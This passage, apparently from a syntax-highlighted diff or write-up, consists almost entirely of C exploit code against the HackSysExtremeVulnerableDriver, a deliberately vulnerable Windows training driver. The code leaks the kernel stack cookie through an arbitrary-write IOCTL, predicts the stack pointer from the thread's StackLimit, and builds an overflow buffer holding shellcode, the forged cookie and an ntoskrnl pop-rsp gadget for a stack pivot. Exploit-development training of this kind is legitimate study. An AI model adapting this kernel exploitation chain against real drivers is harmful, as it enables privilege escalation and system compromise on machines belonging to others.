+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] StackLimit Value: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">stackLimit</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">predictedRSP</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">finalCookie</span> <span class="o">=</span> <span class="nf">CalculateFinalStackCookie</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">securityCookie</span><span class="p">,</span> <span class="n">stackLimit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">predictedRSP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">finalCookie</span> <span class="o">==</span> <span class="mh">0x01</span> <span class="o">||</span> <span class="n">finalCookie</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Error while calling CalculateFinalStackCookie</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Stack Pivot
+</span></span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">krnlBase</span> <span class="o">=</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;ntoskrnl.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">gadget_pop_rsp</span> <span class="o">=</span> <span class="n">krnlBase</span> <span class="o">+</span> <span class="mh">0x02abe6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Performing StackPivot</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cp">#define KSTACK_BUFFER_OFFSET 0x208
+</span></span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">kernelBufferAddr</span> <span class="o">=</span> <span class="n">predictedRSP</span> <span class="o">-</span> <span class="n">KSTACK_BUFFER_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Kernel buffer addr: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kernelBufferAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">buffSize</span> <span class="o">=</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">PADDING_SIZE</span> <span class="o">+</span> <span class="mh">0x8</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">shellcodeAddr</span> <span class="o">=</span> <span class="n">predictedRSP</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">INITIAL_PADDING</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">buffSize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="n">buffSize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">buff</span><span class="o">+</span><span class="n">INITIAL_PADDING</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)(</span><span class="n">buff</span> <span class="o">+</span> <span class="n">BUFFER_SIZE</span><span class="p">)</span> <span class="o">=</span> <span class="n">finalCookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)(</span><span class="n">buff</span> <span class="o">+</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">OFFSET_RDI</span><span class="p">)</span>            <span class="o">=</span> <span class="mh">0x5555555555555555</span><span class="p">;</span>               <span class="c1">// RDI Overwrite
+</span></span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)(</span><span class="n">buff</span> <span class="o">+</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">OFFSET_RSI</span><span class="p">)</span>            <span class="o">=</span> <span class="mh">0x7777777777777777</span><span class="p">;</span>               <span class="c1">// RSI Overwrite
+</span></span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)(</span><span class="n">buff</span> <span class="o">+</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">PADDING_SIZE</span><span class="p">)</span>          <span class="o">=</span> <span class="n">gadget_pop_rsp</span><span class="p">;</span>                   <span class="c1">// RSP 
+</span></span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)(</span><span class="n">buff</span> <span class="o">+</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">PADDING_SIZE</span><span class="p">)</span>    <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">shellcodeAddr</span><span class="p">;</span>    			<span class="c1">// RBX Overwrite
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Sending payload size of 0x%lx bytes:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buffSize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[?] [0x000] Buffer:</span><span class="se">\t</span><span class="s">Y&#39;s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[?] [0x%d] Canary:</span><span class="se">\t</span><span class="s">0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="n">finalCookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[?] [0x%d] RDI:</span><span class="se">\t</span><span class="s">0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">OFFSET_RDI</span><span class="p">,</span>   <span class="mh">0x5555555555555555</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[?] [0x%d] RIP:</span><span class="se">\t</span><span class="s">0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">PADDING_SIZE</span><span class="p">,</span>   <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">shellcodeAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[?] [0x%d] RSP:</span><span class="se">\t</span><span class="s">0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span> <span class="o">+</span> <span class="n">CANARY_SIZE</span> <span class="o">+</span> <span class="n">PADDING_SIZE</span><span class="p">,</span>         <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">gadget_pop_rsp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">buffSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ULONGLONG</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">drvName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nDrivers</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WCHAR</span> <span class="n">szDrivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDrivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nf">wcscmp</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">,</span> <span class="n">drvName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">getSecurityCookie</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">baseAddr</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityValue</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Usermode sketch
+</span></span></span><span class="line"><span class="cl"><span class="cm">    ULONGLONG cookieAddr = baseAddr + SECURITY_COOKIE_OFFSET;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    ULONGLONG securityCookie = *(ULONGLONG*)cookieAddr;
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    *securityAddr = cookieAddr;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    *securityValue = securityCookie;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hFileLeak</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hFileLeak</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] Driver Leak handle @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFileLeak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PWRITE_WHAT_WHERE</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWRITE_WHAT_WHERE</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] Triggering Arbitrary Write to leak cookie...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">cookieAddrKrnl</span> <span class="o">=</span> <span class="n">baseAddr</span> <span class="o">+</span> <span class="n">SECURITY_COOKIE_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] Kernel Source (What): 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookieAddrKrnl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">inputBuffer</span><span class="o">-&gt;</span><span class="n">What</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">cookieAddrKrnl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">inputBuffer</span><span class="o">-&gt;</span><span class="n">Where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">securityValue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] User Destination (Where): 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">securityValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">status</span> <span class="o">=</span> <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFileLeak</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ARBITRARY_WRITE</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[-] DeviceIoControl failed: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">securityAddr</span> <span class="o">=</span> <span class="n">cookieAddrKrnl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] __security_cookie leaked: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">securityValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] Driver Leak Handle closing...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hFileLeak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">status</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">GetStackLimit</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[*] Extracting StackLimit value...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">returnLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">NtQuerySystemInformation</span><span class="p">((</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">)</span><span class="mi">57</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">returnLength</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span> <span class="n">pProcInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">returnLength</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="nf">NtQuerySystemInformation</span><span class="p">((</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">)</span><span class="mi">57</span><span class="p">,</span> <span class="n">pProcInfo</span><span class="p">,</span> <span class="n">returnLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">returnLength</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">DWORD</span> <span class="n">currentPid</span> <span class="o">=</span> <span class="nf">GetCurrentProcessId</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DWORD</span> <span class="n">currentTid</span> <span class="o">=</span> <span class="nf">GetCurrentThreadId</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t\t</span><span class="s">[+] Current Process ID: 0x%lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">currentPid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t\t</span><span class="s">[+] Current Thread ID:  0x%lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">currentTid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span> <span class="n">pCurrProc</span> <span class="o">=</span> <span class="n">pProcInfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">pCurrProc</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="n">DWORD_PTR</span><span class="p">)(</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">UniqueProcessId</span><span class="p">)</span> <span class="o">==</span> <span class="n">currentPid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="n">ULONG</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">NumberOfThreads</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">((</span><span class="n">DWORD_PTR</span><span class="p">)(</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">Threads</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ThreadInfo</span><span class="p">.</span><span class="n">ClientId</span><span class="p">.</span><span class="n">UniqueThread</span><span class="p">)</span> <span class="o">==</span> <span class="n">currentTid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">ULONG64</span> <span class="n">stackLimit</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">Threads</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">StackLimit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="nf">free</span><span class="p">(</span><span class="n">pProcInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t\t</span><span class="s">[+] StackLimit found: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">stackLimit</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">stackLimit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">NextEntryOffset</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pCurrProc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">pCurrProc</span> <span class="o">+</span> <span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">NextEntryOffset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pProcInfo</span><span class="p">)</span> <span class="nf">free</span><span class="p">(</span><span class="n">pProcInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">ArbitraryRead64</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDriver</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">kernelAddress</span><span class="p">,</span> <span class="n">BOOL</span><span class="o">*</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">valueRead</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">WRITE_WHAT_WHERE</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">input</span><span class="p">.</span><span class="n">What</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">kernelAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">input</span><span class="p">.</span><span class="n">Where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">valueRead</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">status</span> <span class="o">=</span> <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ARBITRARY_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">success</span><span class="p">)</span> <span class="o">*</span><span class="n">success</span> <span class="o">=</span> <span class="n">status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">valueRead</span><span class="p">;</span>
